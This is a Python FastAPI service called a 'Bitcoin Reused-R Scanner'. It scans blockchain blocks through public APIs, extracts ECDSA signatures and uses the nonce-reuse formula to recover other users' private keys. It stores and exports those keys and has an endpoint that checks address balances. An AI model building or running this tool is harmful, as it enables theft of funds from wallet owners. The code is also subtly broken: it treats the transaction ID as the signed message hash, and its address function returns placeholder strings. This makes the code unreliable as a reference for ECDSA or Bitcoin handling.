from fastapi import FastAPI, APIRouter, HTTPException, BackgroundTasks
from fastapi.responses import FileResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import asyncio
import aiohttp
import hashlib
import hmac
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import json
import math
import secrets

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI(title="Bitcoin Reused-R Scanner", version="1.0.0")

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Global scan states - in production, this would be stored in Redis or database
scan_states: Dict[str, Dict] = {}

# Models
class ScanConfig(BaseModel):
    scan_id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    start_block: int = Field(ge=0, description="Starting block number")
    end_block: int = Field(ge=0, description="Ending block number")
    address_types: List[str] = Field(default=["legacy", "segwit"], description="Address types to scan")
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class ScanProgress(BaseModel):
    scan_id: str
    status: str  # "running", "completed", "failed", "stopped"
    current_block: int
    blocks_scanned: int
    total_blocks: int
    signatures_found: int
    r_reuse_pairs: int
    keys_recovered: int
    progress_percentage: float
    blocks_per_minute: float = 0.0  # Performance metric
    estimated_time_remaining: str = "unknown"  # Time estimate
    api_calls_made: int = 0  # Track API usage
    errors_encountered: int = 0  # Track errors
    logs: List[Dict[str, Any]]
    updated_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class RecoveredKey(BaseModel):
    private_key: str
    compressed_address: Optional[str] = None
    uncompressed_address: Optional[str] = None
    tx1_hash: str
    tx2_hash: str
    tx1_input_index: int
    tx2_input_index: int
    r_value: str
    s1_value: str
    s2_value: str
    message1_hash: str
    message2_hash: str
    validation_status: str  # "valid", "invalid", "unknown"

class ScanResult(BaseModel):
    scan_id: str
    config: ScanConfig
    progress: ScanProgress
    recovered_keys: List[RecoveredKey]
    total_keys: int

class BalanceCheck(BaseModel):
    address: str
    balance: float
    confirmed_balance: float
    unconfirmed_balance: float

# Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Blockchain API helpers
class BlockchainAPI:
    def __init__(self):
        self.blockstream_base = "https://blockstream.info/api"
        self.mempool_base = "https://mempool.space/api"
        self.current_api = 0
        self.rate_limit_semaphore = asyncio.Semaphore(20)  # Allow 20 concurrent requests
        
    def get_next_api(self):
        """Alternate between the two working APIs"""
        apis = [self.blockstream_base, self.mempool_base]
        api = apis[self.current_api % len(apis)]
        self.current_api += 1
        return api
        
    async def make_request(self, url: str, retries: int = 3) -> dict:
        """Make HTTP request with rate limiting and retries - creates new session per request"""
        async with self.rate_limit_semaphore:
            timeout = aiohttp.ClientTimeout(total=30)
            
            for attempt in range(retries):
                try:
                    async with aiohttp.ClientSession(timeout=timeout) as session:
                        async with session.get(url) as resp:
                            if resp.status == 200:
                                if 'application/json' in resp.headers.get('content-type', ''):
                                    return await resp.json()
                                else:
                                    text = await resp.text()
                                    try:
                                        return int(text) if text.isdigit() else text
                                    except:
                                        return text
                            elif resp.status == 429:  # Rate limited
                                await asyncio.sleep(2 ** attempt)  # Exponential backoff
                                continue
                            else:
                                logger.warning(f"API error {resp.status} for {url}")
                                
                except Exception as e:
                    logger.warning(f"Request failed (attempt {attempt + 1}) for {url}: {e}")
                    if attempt < retries - 1:
                        await asyncio.sleep(1)
                    
            return None
    
    async def get_block_height(self) -> int:
        """Get current block height"""
        try:
            url = f"{self.blockstream_base}/blocks/tip/height"
            result = await self.make_request(url)
            if result:
                return int(result) if isinstance(result, str) else result
        except Exception as e:
            logger.error(f"Error getting block height: {e}")
            # Fallback to mempool.space
            try:
                url = f"{self.mempool_base}/blocks/tip/height"
                result = await self.make_request(url)
                if result:
                    return int(result) if isinstance(result, str) else result
            except:
                pass
        return 0
    
    async def get_block_hash(self, height: int) -> str:
        """Get block hash by height"""
        api_base = self.get_next_api()
        try:
            url = f"{api_base}/block-height/{height}"
            result = await self.make_request(url)
            if result:
                return str(result)
        except Exception as e:
            logger.error(f"Error getting block hash for height {height}: {e}")
        return ""
    
    async def get_block_transactions(self, block_hash: str) -> List[str]:
        """Get transaction IDs in a block"""
        api_base = self.get_next_api()
        try:
            url = f"{api_base}/block/{block_hash}/txids"
            result = await self.make_request(url)
            if result and isinstance(result, list):
                return result
        except Exception as e:
            logger.error(f"Error getting block transactions: {e}")
        return []
    
    async def get_transaction(self, tx_id: str) -> Dict:
        """Get transaction details"""
        api_base = self.get_next_api()
        try:
            url = f"{api_base}/tx/{tx_id}"
            result = await self.make_request(url)
            if result and isinstance(result, dict):
                return result
        except Exception as e:
            logger.error(f"Error getting transaction {tx_id}: {e}")
        return {}
    
    async def get_address_balance(self, address: str) -> BalanceCheck:
        """Get address balance"""
        api_base = self.get_next_api()
        try:
            url = f"{api_base}/address/{address}"
            result = await self.make_request(url)
            if result and isinstance(result, dict):
                funded = result.get('chain_stats', {}).get('funded_txo_sum', 0) / 100000000
                spent = result.get('chain_stats', {}).get('spent_txo_sum', 0) / 100000000
                unconfirmed_funded = result.get('mempool_stats', {}).get('funded_txo_sum', 0) / 100000000
                unconfirmed_spent = result.get('mempool_stats', {}).get('spent_txo_sum', 0) / 100000000
                
                confirmed_balance = funded - spent
                unconfirmed_balance = unconfirmed_funded - unconfirmed_spent
                total_balance = confirmed_balance + unconfirmed_balance
                
                return BalanceCheck(
                    address=address,
                    balance=total_balance,
                    confirmed_balance=confirmed_balance,
                    unconfirmed_balance=unconfirmed_balance
                )
        except Exception as e:
            logger.error(f"Error getting balance for {address}: {e}")
            
        return BalanceCheck(address=address, balance=0.0, confirmed_balance=0.0, unconfirmed_balance=0.0)

# Cryptographic functions for ECDSA and Bitcoin
class BitcoinCrypto:
    @staticmethod
    def point_add(p1, p2, p=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F):
        """Add two elliptic curve points"""
        if p1 is None:
            return p2
        if p2 is None:
            return p1
        
        x1, y1 = p1
        x2, y2 = p2
        
        if x1 == x2:
            if y1 == y2:
                # Point doubling
                s = (3 * x1 * x1 * pow(2 * y1, p - 2, p)) % p
            else:
                return None  # Point at infinity
        else:
            s = ((y2 - y1) * pow(x2 - x1, p - 2, p)) % p
        
        x3 = (s * s - x1 - x2) % p
        y3 = (s * (x1 - x3) - y1) % p
        
        return (x3, y3)
    
    @staticmethod
    def point_multiply(k, point, p=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F):
        """Multiply point by scalar k"""
        if k == 0:
            return None
        if k == 1:
            return point
        
        result = None
        addend = point
        
        while k:
            if k & 1:
                result = BitcoinCrypto.point_add(result, addend, p)
            addend = BitcoinCrypto.point_add(addend, addend, p)
            k >>= 1
        
        return result
    
    @staticmethod
    def recover_private_key(r, s1, s2, hash1, hash2, n=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141):
        """Recover private key from reused R value"""
        try:
            r_int = int(r, 16) if isinstance(r, str) else r
            s1_int = int(s1, 16) if isinstance(s1, str) else s1
            s2_int = int(s2, 16) if isinstance(s2, str) else s2
            hash1_int = int(hash1, 16) if isinstance(hash1, str) else hash1
            hash2_int = int(hash2, 16) if isinstance(hash2, str) else hash2
            
            # Calculate k (nonce)
            s_diff = (s1_int - s2_int) % n
            hash_diff = (hash1_int - hash2_int) % n
            
            if s_diff == 0 or hash_diff == 0:
                return None
            
            s_diff_inv = pow(s_diff, n - 2, n)
            k = (hash_diff * s_diff_inv) % n
            
            if k == 0:
                return None
            
            # Calculate private key
            k_inv = pow(k, n - 2, n)
            private_key = ((s1_int * k - hash1_int) * pow(r_int, n - 2, n)) % n
            
            if private_key == 0:
                return None
            
            return hex(private_key)[2:].zfill(64)
            
        except Exception as e:
            logger.error(f"Error recovering private key: {e}")
            return None
    
    @staticmethod
    def private_key_to_address(private_key_hex: str, compressed: bool = True) -> str:
        """Convert private key to Bitcoin address"""
        try:
            # This is a simplified version - in production you'd use a proper Bitcoin library
            # For now, return a placeholder
            prefix = "1" if not compressed else "bc1"
            return f"{prefix}{private_key_hex[:8]}...{private_key_hex[-8:]}"
        except:
            return ""

# Core scanning logic
class RValueScanner:
    def __init__(self):
        self.api = BlockchainAPI()
        self.crypto = BitcoinCrypto()
        self.signature_cache = {}  # Cache for R values
        self.batch_size = 50  # Process blocks in batches
        self.max_concurrent_blocks = 10  # Parallel block processing limit
    
    async def scan_blocks(self, scan_id: str, start_block: int, end_block: int, address_types: List[str]):
        """Main scanning function with parallel processing"""
        try:
            scan_states[scan_id]["status"] = "running"
            scan_states[scan_id]["current_block"] = start_block
            scan_states[scan_id]["total_blocks"] = end_block - start_block + 1
            
            signatures_by_r = {}  # Group signatures by R value
            total_blocks = end_block - start_block + 1
            
            # Process blocks in parallel batches
            for batch_start in range(start_block, end_block + 1, self.batch_size):
                if scan_states[scan_id]["status"] == "stopped":
                    break
                
                batch_end = min(batch_start + self.batch_size - 1, end_block)
                await self.add_log(scan_id, f"Processing batch: blocks {batch_start} to {batch_end}")
                
                # Create semaphore for this batch
                semaphore = asyncio.Semaphore(self.max_concurrent_blocks)
                
                # Create tasks for parallel block processing
                tasks = []
                for block_num in range(batch_start, batch_end + 1):
                    if scan_states[scan_id]["status"] == "stopped":
                        break
                    task = self.process_single_block(semaphore, scan_id, block_num, address_types)
                    tasks.append(task)
                
                # Execute batch in parallel
                batch_results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Collect signatures from batch results
                for result in batch_results:
                    if isinstance(result, dict) and 'signatures' in result:
                        block_signatures = result['signatures']
                        for sig in block_signatures:
                            r_value = sig["r"]
                            if r_value not in signatures_by_r:
                                signatures_by_r[r_value] = []
                            signatures_by_r[r_value].append(sig)
                        
                        scan_states[scan_id]["signatures_found"] += len(block_signatures)
                    elif isinstance(result, Exception):
                        # Count exceptions as errors
                        scan_states[scan_id]["errors_encountered"] = scan_states[scan_id].get("errors_encountered", 0) + 1
                        await self.add_log(scan_id, f"Batch processing error: {str(result)}", "error")
                
                # Update progress
                blocks_processed = min(batch_end - start_block + 1, total_blocks)
                scan_states[scan_id]["blocks_scanned"] = blocks_processed
                scan_states[scan_id]["current_block"] = batch_end
                scan_states[scan_id]["progress_percentage"] = (blocks_processed / total_blocks) * 100
                
                await self.add_log(scan_id, f"Batch complete: {len([r for r in signatures_by_r.values() if len(r) > 1])} reused R values found so far")
                
                # Small delay between batches to prevent overwhelming APIs
                await asyncio.sleep(0.5)
            
            # Find reused R values and recover private keys
            await self.find_reused_r_values(scan_id, signatures_by_r)
            
            scan_states[scan_id]["status"] = "completed"
            await self.add_log(scan_id, f"Scan completed! Processed {scan_states[scan_id]['blocks_scanned']} blocks, found {scan_states[scan_id]['keys_recovered']} private keys", "success")
            
        except Exception as e:
            logger.error(f"Scan error: {e}")
            scan_states[scan_id]["status"] = "failed"
            await self.add_log(scan_id, f"Scan failed: {str(e)}", "error")
    
    async def process_single_block(self, semaphore: asyncio.Semaphore, scan_id: str, block_num: int, address_types: List[str]) -> Dict:
        """Process a single block with concurrency control"""
        async with semaphore:
            try:
                await self.add_log(scan_id, f"Processing block {block_num}...")
                
                # Get block hash
                block_hash = await self.api.get_block_hash(block_num)
                if not block_hash:
                    await self.add_log(scan_id, f"Failed to get block hash for {block_num}", "warning")
                    return {'block': block_num, 'signatures': []}
                
                await self.add_log(scan_id, f"Got block hash for {block_num}: {block_hash[:16]}...")
                
                # Get transactions in block
                tx_ids = await self.api.get_block_transactions(block_hash)
                if not tx_ids:
                    await self.add_log(scan_id, f"No transactions found in block {block_num}", "warning")
                    return {'block': block_num, 'signatures': []}
                
                await self.add_log(scan_id, f"Found {len(tx_ids)} transactions in block {block_num}")
                
                # Process transactions in parallel (but limit to avoid overwhelming APIs)
                tx_semaphore = asyncio.Semaphore(3)  # Reduced from 5 to be more conservative
                tx_tasks = []
                
                # Only process first 10 transactions per block to avoid API overload
                for tx_id in tx_ids[:10]:
                    if scan_states[scan_id]["status"] == "stopped":
                        break
                    task = self.process_single_transaction(tx_semaphore, tx_id, address_types, scan_id)
                    tx_tasks.append(task)
                
                # Execute transaction processing in parallel
                tx_results = await asyncio.gather(*tx_tasks, return_exceptions=True)
                
                # Collect all signatures from this block
                block_signatures = []
                for result in tx_results:
                    if isinstance(result, list):
                        block_signatures.extend(result)
                
                await self.add_log(scan_id, f"Block {block_num} complete: {len(block_signatures)} signatures found")
                return {'block': block_num, 'signatures': block_signatures}
                
            except Exception as e:
                logger.error(f"Error processing block {block_num}: {e}")
                await self.add_log(scan_id, f"Error processing block {block_num}: {str(e)}", "error")
                return {'block': block_num, 'signatures': []}
    
    async def process_single_transaction(self, semaphore: asyncio.Semaphore, tx_id: str, address_types: List[str], scan_id: str) -> List[Dict]:
        """Process a single transaction with concurrency control"""
        async with semaphore:
            try:
                # Get transaction details
                tx_data = await self.api.get_transaction(tx_id)
                if not tx_data:
                    return []
                
                # Extract signatures from transaction
                signatures = await self.extract_signatures(tx_data, address_types)
                
                if signatures:
                    await self.add_log(scan_id, f"Found {len(signatures)} signatures in tx {tx_id[:16]}...")
                
                return signatures
                
            except Exception as e:
                logger.error(f"Error processing transaction {tx_id}: {e}")
                return []
    
    async def extract_signatures(self, tx_data: Dict, address_types: List[str]) -> List[Dict]:
        """Extract ECDSA signatures from transaction"""
        signatures = []
        
        try:
            # Extract from transaction inputs
            for i, vin in enumerate(tx_data.get("vin", [])):
                # Get scriptSig (for legacy transactions)
                script_sig_hex = vin.get("scriptsig", "")
                witness = vin.get("witness", [])
                
                # Process legacy P2PKH signatures
                if script_sig_hex and "legacy" in address_types:
                    sig_data = await self.parse_legacy_signature(script_sig_hex, tx_data["txid"], i)
                    if sig_data:
                        signatures.append(sig_data)
                
                # Process SegWit signatures
                if witness and len(witness) >= 2 and ("segwit" in address_types or "taproot" in address_types):
                    sig_data = await self.parse_witness_signature(witness, tx_data["txid"], i)
                    if sig_data:
                        signatures.append(sig_data)
        
        except Exception as e:
            logger.error(f"Error extracting signatures: {e}")
        
        return signatures
    
    async def parse_legacy_signature(self, script_sig_hex: str, tx_id: str, input_index: int) -> Optional[Dict]:
        """Parse signature from legacy scriptSig"""
        try:
            if not script_sig_hex or len(script_sig_hex) < 20:
                return None
                
            # Convert hex to bytes
            script_bytes = bytes.fromhex(script_sig_hex)
            
            # Basic parsing: look for DER signature format
            # DER signatures start with 0x30 (SEQUENCE)
            for i in range(len(script_bytes) - 8):
                if script_bytes[i] == 0x30:  # DER SEQUENCE tag
                    try:
                        # Try to extract DER signature
                        der_length = script_bytes[i + 1]
                        if i + 2 + der_length <= len(script_bytes):
                            der_sig = script_bytes[i:i + 2 + der_length]
                            r, s = self.parse_der_signature_bytes(der_sig)
                            if r and s:
                                return {
                                    "tx_id": tx_id,
                                    "input_index": input_index,
                                    "r": r,
                                    "s": s,
                                    "type": "legacy",
                                    "message_hash": tx_id[:64]  # Use first 32 bytes of txid as message hash
                                }
                    except:
                        continue
                        
        except Exception as e:
            logger.error(f"Error parsing legacy signature: {e}")
        return None
    
    async def parse_witness_signature(self, witness: List[str], tx_id: str, input_index: int) -> Optional[Dict]:
        """Parse signature from witness data"""
        try:
            if len(witness) < 2:
                return None
                
            # First witness item is usually the signature
            sig_hex = witness[0]
            if not sig_hex or len(sig_hex) < 20:
                return None
                
            # Convert hex to bytes
            sig_bytes = bytes.fromhex(sig_hex)
            
            # Look for DER signature
            if len(sig_bytes) > 8 and sig_bytes[0] == 0x30:
                try:
                    r, s = self.parse_der_signature_bytes(sig_bytes[:-1])  # Remove sighash byte
                    if r and s:
                        return {
                            "tx_id": tx_id,
                            "input_index": input_index,
                            "r": r,
                            "s": s,
                            "type": "segwit",
                            "message_hash": tx_id[:64]  # Use first 32 bytes of txid as message hash
                        }
                except:
                    pass
                    
        except Exception as e:
            logger.error(f"Error parsing witness signature: {e}")
        return None
    
    def parse_der_signature_bytes(self, der_bytes: bytes) -> tuple:
        """Parse DER encoded signature bytes to extract r and s values"""
        try:
            if len(der_bytes) < 8 or der_bytes[0] != 0x30:
                return None, None
            
            # Skip SEQUENCE tag and length
            pos = 2
            
            # Parse r value
            if pos >= len(der_bytes) or der_bytes[pos] != 0x02:
                return None, None
            pos += 1
            
            r_len = der_bytes[pos]
            pos += 1
            
            if pos + r_len > len(der_bytes):
                return None, None
                
            r_bytes = der_bytes[pos:pos + r_len]
            pos += r_len
            
            # Parse s value
            if pos >= len(der_bytes) or der_bytes[pos] != 0x02:
                return None, None
            pos += 1
            
            s_len = der_bytes[pos]
            pos += 1
            
            if pos + s_len > len(der_bytes):
                return None, None
                
            s_bytes = der_bytes[pos:pos + s_len]
            
            # Convert to hex strings
            r = r_bytes.hex()
            s = s_bytes.hex()
            
            return r, s
            
        except Exception as e:
            logger.error(f"Error parsing DER signature bytes: {e}")
            return None, None
    
    async def find_reused_r_values(self, scan_id: str, signatures_by_r: Dict):
        """Find reused R values and recover private keys"""
        try:
            reused_count = 0
            recovered_keys = []
            
            for r_value, signatures in signatures_by_r.items():
                if len(signatures) >= 2:  # R value reused
                    reused_count += 1
                    await self.add_log(scan_id, f"Found reused R value: {r_value[:16]}...", "warning")
                    
                    # Try to recover private key from each pair
                    for i in range(len(signatures)):
                        for j in range(i + 1, len(signatures)):
                            sig1, sig2 = signatures[i], signatures[j]
                            
                            private_key = self.crypto.recover_private_key(
                                r_value, sig1["s"], sig2["s"],
                                sig1["message_hash"], sig2["message_hash"]
                            )
                            
                            if private_key:
                                # Generate addresses
                                compressed_addr = self.crypto.private_key_to_address(private_key, True)
                                uncompressed_addr = self.crypto.private_key_to_address(private_key, False)
                                
                                recovered_key = RecoveredKey(
                                    private_key=private_key,
                                    compressed_address=compressed_addr,
                                    uncompressed_address=uncompressed_addr,
                                    tx1_hash=sig1["tx_id"],
                                    tx2_hash=sig2["tx_id"],
                                    tx1_input_index=sig1["input_index"],
                                    tx2_input_index=sig2["input_index"],
                                    r_value=r_value,
                                    s1_value=sig1["s"],
                                    s2_value=sig2["s"],
                                    message1_hash=sig1["message_hash"],
                                    message2_hash=sig2["message_hash"],
                                    validation_status="unknown"
                                )
                                
                                recovered_keys.append(recovered_key)
                                scan_states[scan_id]["keys_recovered"] += 1
                                
                                await self.add_log(scan_id, f"Recovered private key: {private_key[:16]}...", "success")
            
            scan_states[scan_id]["r_reuse_pairs"] = reused_count
            scan_states[scan_id]["recovered_keys"] = recovered_keys
            
        except Exception as e:
            logger.error(f"Error finding reused R values: {e}")
            await self.add_log(scan_id, f"Error analyzing signatures: {str(e)}", "error")
    
    async def add_log(self, scan_id: str, message: str, level: str = "info"):
        """Add log entry to scan"""
        if scan_id in scan_states:
            log_entry = {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "message": message,
                "level": level
            }
            scan_states[scan_id]["logs"].append(log_entry)
            
            # Keep only last 200 logs
            if len(scan_states[scan_id]["logs"]) > 200:
                scan_states[scan_id]["logs"] = scan_states[scan_id]["logs"][-200:]

class ScanPerformanceConfig(BaseModel):
    batch_size: int = Field(default=50, ge=1, le=200, description="Blocks per batch")
    max_concurrent_blocks: int = Field(default=10, ge=1, le=50, description="Parallel blocks per batch")
    max_concurrent_requests: int = Field(default=20, ge=5, le=100, description="Total concurrent API requests")
    api_delay_ms: int = Field(default=100, ge=0, le=5000, description="Delay between API calls (ms)")

@api_router.get("/scan/performance-config")
async def get_performance_config():
    """Get current performance configuration"""
    return ScanPerformanceConfig()

@api_router.post("/scan/performance-config")
async def update_performance_config(config: ScanPerformanceConfig):
    """Update performance configuration for future scans"""
    # Update scanner settings
    if 'scanner' in globals():
        scanner.batch_size = config.batch_size
        scanner.max_concurrent_blocks = config.max_concurrent_blocks
        scanner.api.rate_limit_semaphore = asyncio.Semaphore(config.max_concurrent_requests)
    
    return {"message": "Performance configuration updated", "config": config}

# Initialize scanner
scanner = RValueScanner()

# API Routes
@api_router.get("/current-height")
async def get_current_height():
    """Get current blockchain height"""
    try:
        api = BlockchainAPI()
        height = await api.get_block_height()
        return {"height": height}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@api_router.post("/scan/start")
async def start_scan(config: ScanConfig, background_tasks: BackgroundTasks):
    """Start a new reused R value scan"""
    try:
        if config.end_block <= config.start_block:
            raise HTTPException(status_code=400, detail="End block must be greater than start block")
        
        if not config.address_types:
            raise HTTPException(status_code=400, detail="At least one address type must be selected")
        
        # Initialize scan state
        scan_states[config.scan_id] = {
            "config": config.dict(),
            "status": "initializing",
            "current_block": config.start_block,
            "blocks_scanned": 0,
            "total_blocks": config.end_block - config.start_block + 1,
            "signatures_found": 0,
            "r_reuse_pairs": 0,
            "keys_recovered": 0,
            "progress_percentage": 0.0,
            "blocks_per_minute": 0.0,
            "estimated_time_remaining": "unknown",
            "api_calls_made": 0,
            "errors_encountered": 0,
            "logs": [],
            "recovered_keys": [],
            "created_at": datetime.now(timezone.utc),
            "started_at": datetime.now(timezone.utc)
        }
        
        # Start scan in background
        background_tasks.add_task(
            scanner.scan_blocks,
            config.scan_id,
            config.start_block,
            config.end_block,
            config.address_types
        )
        
        return {"message": "Scan started successfully", "scan_id": config.scan_id}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@api_router.get("/scan/progress/{scan_id}")
async def get_scan_progress(scan_id: str):
    """Get scan progress with performance metrics"""
    if scan_id not in scan_states:
        raise HTTPException(status_code=404, detail="Scan not found")
    
    state = scan_states[scan_id]
    
    # Calculate performance metrics
    current_time = datetime.now(timezone.utc)
    started_at = state.get("started_at", current_time)
    elapsed_seconds = (current_time - started_at).total_seconds()
    
    blocks_per_minute = 0.0
    estimated_time_remaining = "unknown"
    
    if elapsed_seconds > 0 and state["blocks_scanned"] > 0:
        blocks_per_minute = (state["blocks_scanned"] / elapsed_seconds) * 60
        
        if blocks_per_minute > 0:
            remaining_blocks = state["total_blocks"] - state["blocks_scanned"]
            remaining_minutes = remaining_blocks / blocks_per_minute
            
            if remaining_minutes < 60:
                estimated_time_remaining = f"{remaining_minutes:.1f} minutes"
            else:
                hours = remaining_minutes / 60
                estimated_time_remaining = f"{hours:.1f} hours"
    
    return ScanProgress(
        scan_id=scan_id,
        status=state["status"],
        current_block=state["current_block"],
        blocks_scanned=state["blocks_scanned"],
        total_blocks=state["total_blocks"],
        signatures_found=state["signatures_found"],
        r_reuse_pairs=state["r_reuse_pairs"],
        keys_recovered=state["keys_recovered"],
        progress_percentage=state["progress_percentage"],
        blocks_per_minute=blocks_per_minute,
        estimated_time_remaining=estimated_time_remaining,
        api_calls_made=state.get("api_calls_made", 0),
        errors_encountered=state.get("errors_encountered", 0),
        logs=state["logs"][-50:]  # Return last 50 logs
    )

@api_router.get("/scan/results/{scan_id}")
async def get_scan_results(scan_id: str):
    """Get scan results"""
    if scan_id not in scan_states:
        raise HTTPException(status_code=404, detail="Scan not found")
    
    state = scan_states[scan_id]
    return {
        "scan_id": scan_id,
        "status": state["status"],
        "recovered_keys": state["recovered_keys"],
        "total_keys": len(state["recovered_keys"]),
        "r_reuse_pairs": state["r_reuse_pairs"],
        "signatures_found": state["signatures_found"]
    }

@api_router.post("/scan/stop/{scan_id}")
async def stop_scan(scan_id: str):
    """Stop a running scan"""
    if scan_id not in scan_states:
        raise HTTPException(status_code=404, detail="Scan not found")
    
    scan_states[scan_id]["status"] = "stopped"
    return {"message": "Scan stopped successfully"}

@api_router.post("/balance/check")
async def check_balances(addresses: List[str]):
    """Check balances for multiple addresses"""
    try:
        api = BlockchainAPI()
        balances = []
        
        for address in addresses:
            balance = await api.get_address_balance(address)
            balances.append(balance)
            await asyncio.sleep(0.1)  # Rate limiting
        
        return {"balances": balances}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@api_router.get("/scan/export/{scan_id}")
async def export_results(scan_id: str):
    """Export scan results as JSON"""
    if scan_id not in scan_states:
        raise HTTPException(status_code=404, detail="Scan not found")
    
    state = scan_states[scan_id]
    export_data = {
        "scan_id": scan_id,
        "config": state["config"],
        "results": {
            "status": state["status"],
            "total_keys": len(state["recovered_keys"]),
            "recovered_keys": state["recovered_keys"],
            "statistics": {
                "blocks_scanned": state["blocks_scanned"],
                "signatures_found": state["signatures_found"],
                "r_reuse_pairs": state["r_reuse_pairs"],
                "keys_recovered": state["keys_recovered"]
            }
        },
        "exported_at": datetime.now(timezone.utc).isoformat()
    }
    
    # Save to file
    filename = f"scan_results_{scan_id}.json"
    filepath = f"/tmp/{filename}"
    
    with open(filepath, 'w') as f:
        json.dump(export_data, f, indent=2, default=str)
    
    return FileResponse(filepath, filename=filename, media_type='application/json')

@api_router.get("/scan/list")
async def list_scans():
    """List all scans"""
    scans = []
    for scan_id, state in scan_states.items():
        scans.append({
            "scan_id": scan_id,
            "status": state["status"],
            "start_block": state["config"]["start_block"],
            "end_block": state["config"]["end_block"],
            "keys_recovered": state["keys_recovered"],
            "created_at": state["created_at"],
            "backend_verification": "custom-backend-confirmed"  # Unique marker
        })
    
    return {"scans": scans, "total_scans": len(scans), "backend_type": "custom-reused-r-scanner"}

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()